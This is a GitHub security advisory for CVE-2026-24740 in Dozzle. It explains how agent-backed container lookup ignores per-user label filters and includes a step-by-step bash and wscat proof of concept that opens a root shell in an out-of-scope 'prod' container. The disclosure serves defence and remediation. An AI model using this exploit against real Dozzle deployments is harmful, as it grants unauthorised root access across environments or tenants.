# [H] Dozzle Agent Label-Based Access Control Bypass Allows Unauthorized Container Shell Access

## Summary
Severity: High
Advisory: GHSA-m855-r557-5rc5
CVE: CVE-2026-24740
CWE: CWE-284, CWE-639
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-27
Source: https://github.com/advisories/GHSA-m855-r557-5rc5
Type: github-advisory

## Affected
- Go: `github.com/amir20/dozzle` — affected >=0 <1.29.1-0.20260125230338-620e59aa2463

## Details
### Summary
A flaw in Dozzle’s agent-backed shell endpoints allows a user restricted by label filters (for example, `label=env=dev`) to obtain an interactive root shell in out‑of‑scope containers (for example, `env=prod`) on the same agent host by directly targeting their container IDs.

**Note**: Tested on `v9.0.2` likely affects all versions with agent mode support.

### Details
When SIMPLE auth is enabled, Dozzle supports per‑user label filters in `users.yaml` (for example, filter: `label=env=dev`) to restrict which containers a user can see and interact with. These filters are propagated into the shell handlers, which resolve the target container via `h.hostService.FindContainer(hostKey(r), id, userLabels)` in both the attach and exec WebSocket endpoints, intending to limit shell access to containers within the user’s label scope.

For agent-backed hosts, the corresponding implementation ignores the label scope when resolving a container by ID ([agent_service.go#L27-L29](https://github.com/amir20/dozzle/blob/master/internal/support/container/agent_service.go#L27-L29)):
```go
func (a *agentService) FindContainer(ctx context.Context, id string, labels container.ContainerLabels) (container.Container, error) {
    return a.client.FindContainer(ctx, id)
}
```

As a result, an authenticated user configured with filter: `label=env=dev` and granted the shell role cannot see `env=prod` containers in the UI, but can still establish an interactive exec session into an `env=prod` container by calling `/api/hosts/{hostId}/containers/{containerId}/exec` (or `/attach`) with a valid JWT and the target container ID. This discrepancy between listing and exec/attach behavior breaks the intended label‑based isolation between environments or tenants for agent-backed deployments.

**Note**: The underlying Docker client implementation explicitly documents that `FindContainer` skips filters ([docker/client.go#L128-L137](https://github.com/amir20/dozzle/blob/master/internal/docker/client.go#L128-L137)):
```go
// Finds a container by id, skipping the filters
func (d *DockerClient) FindContainer(ctx context.Context, id string) (container.Container, error) {
    log.Debug().Str("id", id).Msg("Finding container")
    if json, err := d.cli.ContainerInspect(ctx, id); err == nil {
        return newContainerFromJSON(json, d.host.ID), nil
    } else {
        return container.Container{}, err
    }
}
```

**Note**: For reference, we can see the correct implementation in `ListContainers` ([agent_service.go#L43-L46](https://github.com/amir20/dozzle/blob/master/internal/support/container/agent_service.go#L43-L46)):
```go
func (a *agentService) ListContainers(ctx context.Context, labels container.ContainerLabels) ([]container.Container, error) {
	log.Debug().Interface("labels", labels).Msg("Listing containers from agent")
	return a.client.ListContainers(ctx, labels)
}
```
### PoC
```bash
# create new dir
$ cd /tmp && mkdir -p /tmp/dozzle && cd /tmp/dozzle && mkdir -p data

# run dozzle agent
$ docker run -d --name dozzle-agent \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  -p 7007:7007 \
  amir20/dozzle:latest agent

# sleep
$ sleep 5

# run dev container
$ docker run -d --name dev-allowed --label env=dev alpine sleep 100000

# run prod container
$ docker run -d --name prod-secret --label env=prod alpine sleep 100000

# check containers status
$ docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Label \"env\"}}" | grep -E 'dev-allowed|prod-secret'
3731627f4e2d   prod-secret    prod
51e6cffce99f   dev-allowed    dev

# get hash for pass:devpass
$ HASH=$(printf 'devpass' | sha256sum | awk '{print $1}')

# create dev user
$ cat > /tmp/dozzle/data/users.yaml << EOF
users:
  devuser:
    email: dev@example.com
    name: Dev User
    password: ${HASH}
    filter: "label=env=dev"
    roles: "shell"
EOF

# sanity check users 
$ cat /tmp/dozzle/data/users.yaml
users:
  devuser:
    email: dev@example.com
    name: Dev User
    password: fee39c23856e3d9dd500861a30903548b8878994291b2fef7fff2f53b3073c0c
    filter: "label=env=dev"
    roles: "shell"

# run main image
$ docker run -d --name dozzle-main \
  -v /tmp/dozzle/data:/data \
  -p 8080:8080 \
  -e DOZZLE_AUTH_PROVIDER=simple \
  -e DOZZLE_AUTH_TTL=48h \
  -e DOZZLE_ENABLE_SHELL=true \
  -e "DOZZLE_REMOTE_AGENT=host.docker.internal:7007" \
  amir20/dozzle:latest

# sleep
$ sleep 8

# get jwt token for devuser
$ curl -s -X POST http://localhost:8080/api/token \
  -d "username=devuser&password=devpass" \
  -c /tmp/dozzle/cookies.txt

# save the token
$ TOKEN=$(grep jwt /tmp/dozzle/cookies.txt | awk '{print $7}')

# in browser open http://localhost:8080 -> login with user:devuser pass:devpass -> grab host http://localhost:8080/host/cafb9ffc-ac34-47a6-985b-10ffea39610e
$ HOST_ID="cafb9ffc-ac34-47a6-985b-10ffea39610e"

# get prod cid
$ PROD_CID=$(docker ps --filter "name=prod-secret" --format '{{.ID}}')

# sanity check
$ echo $PROD_CID
3731627f4e2d

# install wscat
$ npm install -g wscat

# open wscat with token
$ wscat -c "ws://localhost:8080/api/hosts/${HOST_ID}/containers/${PROD_CID}/exec" \
  -H "Cookie: jwt=${TOKEN}"
Connected (press CTRL+C to quit)
< / # 
/ # 
> {"type":"userinput","data":"id\n"}
< id

< uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # 
> {"type":"userinput","data":"cat /etc/hostname\n"}
< cat /etc/hostname

< 3731627f4e2d

< / # 
> quit
Disconnected (code: 1006, reason: "")
```
As configured, `devuser` only sees dev-allowed in the Dozzle UI (due to filter: `label=env=dev`), but can still open a root shell in prod-secret via the agent-backed exec endpoint by supplying its container ID.

### Impact
This is an authorization bypass in environments that rely on SIMPLE auth label filters together with agents to separate environments or tenants. A user who should be constrained to a specific label set (for example, `env=dev`) but has the Shell role can gain full interactive access (**read**, **modify**, **disrupt**) to containers with other labels (for example, `env=prod`) on the same agent host, provided they can obtain the target container ID.

### Remediation
- In the agent-backed `FindContainer` implementation, enforce the same label-based filtering semantics as the Docker/Kubernetes host implementations by ensuring the requested (host, containerId) is within the set returned by `ListContainers` for the caller’s `userLabels` before returning it to exec/attach.

- Add regression tests verifying that a user with filter: `label=env=dev` and the Shell role cannot exec or attach into `env=prod` containers via the agent path, even when supplying a valid container ID.

- As defense in depth, reject exec/attach requests when the resolved container is not present in the user-visible subset returned by the list API under the same label filter.

This issue has been fixed in version 9.0.3 but the Go registry only contains versions up to 1.29.0. Use Docker or GitHub to download 
9.0.3.

### Resources
- https://dozzle.dev/guide/authentication#setting-specific-filters-for-users

## References
- https://github.com/amir20/dozzle/security/advisories/GHSA-m855-r557-5rc5
- https://nvd.nist.gov/vuln/detail/CVE-2026-24740
- https://github.com/amir20/dozzle/commit/620e59aa246347ba8a27e68c532853b8a5137bc1
- https://github.com/amir20/dozzle
- https://github.com/amir20/dozzle/releases/tag/v9.0.3
